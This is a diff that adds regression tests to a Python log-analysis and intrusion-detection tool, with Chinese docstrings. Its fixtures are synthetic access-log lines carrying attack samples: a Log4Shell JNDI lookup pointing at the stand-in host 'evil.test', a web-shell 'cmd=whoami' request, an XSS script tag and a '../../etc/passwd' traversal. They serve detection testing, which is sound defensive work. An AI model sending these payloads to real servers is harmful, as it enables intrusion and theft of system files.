@@ -14,12 +14,14 @@ from bla.models import (
     AnalysisSummary, DetectionAlert, ThreatLevel, TimelineEntry,
 )
 from bla.output.html_report import generate_html_report
+from bla.output.bundle import generate_report_bundle
 from bla.output.sarif_report import generate_sarif_report
 from bla.output.terminal import print_terminal_report
-from bla.parsers import _parse_generic
+from bla.parsers import _parse_generic, auto_parse
 from bla.parsers.linux_auth import parse_linux_auth
 from bla.parsers.web_access import parse_web_access
 from bla.parsers.windows_evtx import _parse_xml_event, parse_windows_xml
+from bla.rules import reset_rule_cache, set_rule_dirs
 from bla.utils.helpers import is_private_ip, normalize_timestamp, set_syslog_year
 
 
@@ -416,6 +418,95 @@ class RegressionTests(unittest.TestCase):
         iocs = extract_iocs(result.events, alerts=summary.alerts)
         self.assertNotIn("example.com", iocs["domains"])
         self.assertNotIn("localhost", iocs["domains"])
+
+    def test_report_bundle_generates_standard_outputs(self):
+        """--out 背后的 bundle 输出应生成完整交付目录。"""
+        content = (
+            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
+            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
+        )
+        result = parse_web_access(content, "access.log")
+        summary = run_detection(result.events)
+        with tempfile.TemporaryDirectory() as tmp:
+            out_dir = Path(tmp) / "report"
+            paths = generate_report_bundle([result], summary, str(out_dir))
+            for key in ("html", "json", "csv", "ioc", "sarif"):
+                self.assertTrue(Path(paths[key]).exists(), key)
+            self.assertEqual(Path(paths["html"]).name, "index.html")
+
+    def test_builtin_yaml_web_rule_detects_log4shell(self):
+        """内置 YAML 规则应参与 Web 检测。"""
+        content = (
+            "8.8.8.8 - - [15/Mar/2024:10:00:00 +0800] "
+            "\"GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.test%2Fa%7D HTTP/1.1\" "
+            "200 10 \"-\" \"curl/8\"\n"
+        )
+        result = parse_web_access(content, "access.log")
+        self.assertEqual(result.events[0].rule_name, "Log4Shell/JNDI 探测")
+        self.assertIn("log4shell", result.events[0].tags)
+
+    def test_custom_yaml_rules_can_extend_web_detection(self):
+        """用户自定义 YAML 规则目录可扩展 Web 检测，无需改 Python 源码。"""
+        with tempfile.TemporaryDirectory() as tmp:
+            rules_dir = Path(tmp) / "rules"
+            rules_dir.mkdir()
+            (rules_dir / "web_custom.yaml").write_text(
+                """
+web_attacks:
+  - id: WEB-CUSTOM-UNIT
+    name: 单元测试自定义规则
+    level: high
+    category: Web攻击
+    mitre: T1190
+    tags: [custom-test, web-attack]
+    patterns:
+      - 'unit-test-probe'
+""",
+                encoding="utf-8",
+            )
+            set_rule_dirs([str(rules_dir)])
+            try:
+                content = (
+                    "7.7.7.7 - - [15/Mar/2024:10:00:00 +0800] "
+                    "\"GET /unit-test-probe HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
+                )
+                result = parse_web_access(content, "access.log")
+            finally:
+                set_rule_dirs([])
+                reset_rule_cache()
+
+        self.assertEqual(result.events[0].rule_name, "单元测试自定义规则")
+        self.assertIn("custom-test", result.events[0].tags)
+        summary = run_detection(result.events)
+        alert = next(a for a in summary.alerts if a.rule_name == "Web攻击: 单元测试自定义规则")
+        self.assertEqual(alert.rule_id, "WEB-CUSTOM-UNIT")
+
+    def test_web_alert_preserves_highest_event_level(self):
+        """Web 聚合告警不应把单条 HIGH 事件降成 MEDIUM。"""
+        content = (
+            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
+            "\"GET /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" "
+            "200 10 \"-\" \"Mozilla/5.0\"\n"
+        )
+        result = parse_web_access(content, "access.log")
+        summary = run_detection(result.events)
+        alert = next(a for a in summary.alerts if a.rule_name == "Web攻击: XSS攻击")
+        self.assertEqual(alert.level, ThreatLevel.HIGH)
+
+    def test_auto_parse_streams_web_logs_from_file(self):
+        """自动识别 Web 日志时应能直接从文件路径解析，并保留文件大小。"""
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "access.log"
+            path.write_text(
+                "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
+                "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n",
+                encoding="utf-8",
+            )
+            result = auto_parse(str(path))
+
+        self.assertEqual(result.log_type, "Web Access Log (Apache/Nginx)")
+        self.assertGreater(result.file_size_bytes, 0)
+        self.assertEqual(result.events[0].rule_name, "路径遍历")
 
 
 if __name__ == "__main__":
